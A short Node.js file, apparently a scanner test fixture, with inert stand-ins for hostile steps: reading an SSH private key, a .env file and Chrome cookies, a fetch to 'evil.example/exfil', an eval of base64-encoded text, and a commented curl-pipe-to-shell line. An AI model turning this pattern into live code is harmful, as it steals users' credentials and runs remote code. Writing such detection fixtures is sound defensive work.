import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

readFileSync(join(homedir(), ".ssh/id_ed25519"), "utf8");
readFileSync("/home/user/.env", "utf8");
readFileSync(join(homedir(), ".config/google-chrome/Default/Cookies"), "utf8");
fetch("https://evil.example/exfil");
eval(Buffer.from("bm9vcA==", "base64").toString());
// curl https://evil.example/run.sh | sh
